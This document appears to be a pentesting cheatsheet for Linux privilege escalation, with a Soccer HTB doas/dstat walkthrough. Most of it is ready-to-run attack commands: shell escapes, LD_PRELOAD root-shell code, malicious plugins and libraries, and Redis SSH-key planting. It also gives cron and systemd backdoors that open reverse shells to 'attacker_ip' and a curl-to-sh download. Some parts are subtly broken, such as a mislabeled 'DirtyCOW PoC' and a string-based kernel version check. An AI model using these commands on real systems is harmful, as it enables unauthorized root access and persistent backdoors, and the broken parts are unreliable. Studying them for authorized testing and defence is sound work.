+++
title = 'Linux Privilege Escalation Cheatsheet'
date = '2024-01-01'
draft = false
description = 'Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more'
tags = ['linux', 'privilege-escalation', 'pentesting', 'doas', 'sudo']
categories = ['cheatsheets']
+++

# Linux Privilege Escalation Cheatsheet

## Initial Enumeration

### System Information
```bash
# Basic system info
uname -a
cat /etc/os-release
cat /etc/issue
hostname

# Current user context
id
whoami
groups
cat /etc/passwd | grep sh

# Environment variables
env
printenv
echo $PATH
```

### User and Group Enumeration
```bash
# List all users
cat /etc/passwd

# Users with login shells
cat /etc/passwd | grep sh

# Current user privileges
sudo -l
find / -user $(whoami) 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
find / -group $(whoami) 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'

# Check for interesting group memberships
groups
id

# Find files owned by current user
find / -user $(id -u) 2>/dev/null
find / -group $(id -g) 2>/dev/null
```

---

## SUID and SGID Analysis

### Finding SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Common SUID binaries to check
ls -la /usr/bin/passwd
ls -la /usr/bin/sudo
ls -la /usr/bin/su
ls -la /usr/local/bin/doas
```

### GTFOBins Exploitation
```bash
# Check GTFOBins for binary exploitation
# https://gtfobins.github.io/

# Common exploitable SUID binaries:
# - /usr/bin/find
find . -exec /bin/sh -p \; -quit

# - /usr/bin/vim
vim -c ':!/bin/sh'

# - /usr/bin/less
less /etc/profile
!/bin/sh

# - /usr/bin/more
more /etc/profile
!/bin/sh

# - /usr/bin/nmap (older versions)
nmap --interactive
!sh

# - /usr/bin/awk
awk 'BEGIN {system("/bin/sh")}'
```

---

## doas Privilege Escalation

### doas Configuration Analysis
```bash
# Find doas binary and configuration
find / -name doas 2>/dev/null
find / -name doas.conf 2>/dev/null

# Common doas locations
ls -la /usr/local/bin/doas
ls -la /usr/local/etc/doas.conf

# Check doas configuration
cat /usr/local/etc/doas.conf

# Example vulnerable configuration:
# permit nopass player as root cmd /usr/bin/dstat
```

### doas Exploitation Techniques
```bash
# Basic doas command execution
doas /usr/bin/dstat

# Check what commands are allowed
doas -n /usr/bin/dstat --help

# If specific command is allowed, look for ways to abuse it
# Example: dstat with custom plugins

# doas with dstat privilege escalation
# 1. Check if you can write to dstat plugin directory
find / -group $(id -g) 2>/dev/null | grep dstat
ls -la /usr/local/share/dstat

# 2. Create malicious dstat plugin
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_exploit.py

# 3. Execute with doas
doas /usr/bin/dstat --exploit
```

### doas vs sudo Differences
```bash
# doas syntax
doas command

# doas with specific user
doas -u root command

# Check doas configuration syntax
# permit [options] identity [as target] [cmd command [args ...]]

# Common doas misconfigurations:
# - permit nopass user as root cmd /path/to/binary
# - Allowing commands that can spawn shells
# - Wildcard permissions
```

---

## sudo Privilege Escalation

### sudo Enumeration
```bash
# Check sudo privileges
sudo -l

# Check sudo version
sudo --version

# Common sudo misconfigurations:
# - NOPASSWD entries
# - Wildcard permissions
# - Commands that allow shell escapes
```

### sudo Exploitation Examples
```bash
# sudo with shell escape commands
sudo vim
:!/bin/bash

sudo less /etc/profile
!/bin/bash

sudo find /etc -name "*.conf" -exec /bin/bash \;

# sudo with environment variables
sudo -E /bin/bash

# sudo with LD_PRELOAD
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/exploit.c
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so /bin/bash

# sudo with LD_LIBRARY_PATH
mkdir /tmp/lib
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/lib/exploit.c
gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c
sudo LD_LIBRARY_PATH=/tmp/lib /bin/bash
```

---

## Writable Directory Exploitation

### Finding Writable Directories
```bash
# Find world-writable directories
find / -type d -perm -002 2>/dev/null

# Find directories writable by current user
find / -type d -writable 2>/dev/null

# Find directories owned by current user
find / -type d -user $(whoami) 2>/dev/null

# Common locations to check
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm
ls -la /usr/local/share
```

### PATH Manipulation
```bash
# Check current PATH
echo $PATH

# Create malicious binary in writable directory
echo '#!/bin/bash\n/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls

# Modify PATH to prioritize malicious binary
export PATH=/tmp:$PATH

# Wait for privileged process to execute our binary
# Or trigger execution through cron jobs, scripts, etc.
```

### Library Hijacking
```bash
# Check for writable library directories
find / -type d -writable 2>/dev/null | grep -E "(lib|lib64)"

# Check LD_LIBRARY_PATH in processes
ps aux | grep -i ld_library

# Create malicious shared library
echo 'void _init() { setgid(0); setuid(0); system("/bin/bash"); }' > /tmp/exploit.c
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles

# Place in writable library directory
cp /tmp/exploit.so /writable/lib/directory/
```

---

## Process and Service Analysis

### Running Processes
```bash
# List all processes
ps aux
ps -ef --forest

# Processes running as root
ps aux | grep root

# Network connections
ss -tlnp
netstat -tulnp

# Check for processes with interesting capabilities
/sbin/getcap -r / 2>/dev/null
```

### Cron Jobs and Scheduled Tasks
```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# User cron jobs
crontab -l
cat /var/spool/cron/crontabs/*

# Systemd timers
systemctl list-timers
find /etc/systemd -name "*.timer"
```

### Services and Sockets
```bash
# Running services
systemctl list-units --type=service --state=running

# Check service files for misconfigurations
find /etc/systemd -name "*.service" -exec grep -l "User\|Group" {} \;

# Socket files
systemctl list-units --type=socket
find /etc/systemd -name "*.socket"
```

---

## File System Analysis

### Configuration Files
```bash
# Check for readable sensitive files
find /etc -readable -type f 2>/dev/null | head -20

# Database configuration files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(sql|db|database)"

# Web application configs
find / -name "wp-config.php" -o -name "config.php" -o -name ".env" 2>/dev/null

# SSH keys and certificates
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

### Log Files
```bash
# System logs
find /var/log -readable -type f 2>/dev/null

# Application logs
find / -name "*.log" -readable 2>/dev/null | head -10

# Check logs for passwords or sensitive information
grep -r -i "password\|passwd\|secret\|token" /var/log/ 2>/dev/null
```

### Backup Files
```bash
# Find backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null

# Database backups
find / -name "*.sql" -o -name "*.dump" -o -name "*.db" 2>/dev/null

# Configuration backups
find /etc -name "*.bak" -o -name "*.old" -o -name "*.orig" 2>/dev/null
```

---

## Application-Specific Exploits

### dstat Plugin Exploitation
```bash
# Check dstat plugin directories
find / -name "*dstat*" -type d 2>/dev/null
ls -la /usr/share/dstat
ls -la /usr/local/share/dstat

# Check permissions on plugin directory
ls -la /usr/local/share/dstat

# Create malicious dstat plugin
cat > /usr/local/share/dstat/dstat_exploit.py << 'EOF'
import os
os.execv("/bin/sh", ["sh"])
EOF

# Execute with doas/sudo
doas /usr/bin/dstat --exploit
```

### Python Library Hijacking
```bash
# Check Python path
python -c "import sys; print('\n'.join(sys.path))"

# Find writable Python directories
python -c "import sys; print('\n'.join([p for p in sys.path if __import__('os').access(p, __import__('os').W_OK)]))"

# Create malicious module
echo 'import os; os.execv("/bin/sh", ["sh"])' > /writable/python/path/exploit.py

# Import in vulnerable application
python -c "import exploit"
```

### Binary Wrapper Exploitation
```bash
# Create wrapper script for allowed commands
cat > /tmp/malicious_script << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/malicious_script

# If PATH manipulation is possible
export PATH=/tmp:$PATH

# Or create binary with same name as allowed command
cp /bin/bash /tmp/allowed_binary_name
```

---

## Kernel and System Exploits

### Kernel Version Checking
```bash
# Kernel version
uname -r
cat /proc/version

# Check for known kernel exploits
searchsploit linux kernel $(uname -r)

# Distribution-specific exploits
lsb_release -a
cat /etc/os-release
```

### Common Kernel Exploits
```bash
# Dirty COW (CVE-2016-5195)
# Affects Linux kernel versions 2.6.22 to 4.8.3

# DirtyCOW PoC
echo 'int main() { setuid(0); system("/bin/bash"); return 0; }' > /tmp/cow.c
gcc -o /tmp/cow /tmp/cow.c

# Check for vulnerable kernel
if [[ $(uname -r | cut -d. -f1-2) < "4.9" ]]; then
    echo "Potentially vulnerable to DirtyCOW"
fi
```

---

## Container Escape Techniques

### Docker Container Detection
```bash
# Check if running in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Check for container runtime
ps aux | grep -E "(docker|containerd|runc)"

# Check capabilities
/sbin/getcap -r / 2>/dev/null
capsh --print
```

### Container Privilege Escalation
```bash
# Check for privileged container
cat /proc/self/status | grep Cap

# Check for host filesystem mounts
mount | grep -E "/(proc|sys|dev)"

# Look for Docker socket
find / -name "docker.sock" 2>/dev/null

# Check for host processes visible
ps aux | wc -l
```

---

## Network-Based Privilege Escalation

### Internal Network Discovery
```bash
# Network interfaces
ip addr show
ifconfig -a

# ARP table
arp -a
ip neigh show

# Network connections
ss -tulnp
netstat -tulnp

# Port scanning internal network
for i in {1..254}; do ping -c 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up"; done
```

### Service Exploitation
```bash
# Check for internal services
nmap -sT -O localhost
ss -tlnp | grep LISTEN

# Database connections
mysql -u root -p
psql -U postgres

# Redis exploitation
redis-cli
CONFIG GET dir
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET crackit "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
SAVE
```

---

## Persistence Mechanisms

### SSH Key Injection
```bash
# Generate SSH key pair
ssh-keygen -t rsa -f /tmp/key

# Add public key to authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /home/user/.ssh/authorized_keys

# Set proper permissions
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

### Cron Job Backdoors
```bash
# Add malicious cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'" >> /etc/crontab

# User-specific cron
crontab -e
# Add: * * * * * /path/to/backdoor
```

### Service Backdoors
```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Backdoor
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

---

## Automated Enumeration Tools

### LinPEAS
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
# Download LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### LSE (Linux Smart Enumeration)
```bash
# Download and run LSE
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l1  # Level 1 checks
./lse.sh -l2  # Level 2 checks
```

---

## Real-World Example: Soccer HTB doas/dstat

### Initial Discovery
```bash
# Found user can write to dstat plugin directory
player@soccer:/usr/local/share$ find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
/usr/local/share/dstat

# Check doas configuration
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

# Check directory permissions
player@soccer:/usr/local/share$ ls -la
drwxrwx---  2 root player 4096 Dec 12  2022 dstat
```

### Exploitation
```bash
# Create malicious dstat plugin
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_exploit.py

# Execute with doas
doas /usr/bin/dstat --exploit

# Alternative method using GTFOBins reference
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_exploit.py
doas /usr/bin/dstat --exploit
```

---

## Prevention and Hardening

### Secure Configuration Practices
```bash
# Proper doas configuration
# Use specific commands only, avoid wildcards
permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2

# Secure sudo configuration
# Avoid NOPASSWD where possible
# Use command aliases for complex commands
# Regularly audit sudo rules

# File permission hardening
# Remove world-writable permissions
find / -type d -perm -002 -exec chmod o-w {} \;
find / -type f -perm -002 -exec chmod o-w {} \;
```

### Monitoring and Detection
```bash
# Monitor privilege escalation attempts
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes
auditctl -w /etc/sudoers -p wa -k sudo_changes

# Log sudo/doas usage
# Configure proper logging in /etc/sudoers or doas.conf

# File integrity monitoring
# Use tools like AIDE or Tripwire to monitor critical files
```

---

*Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.*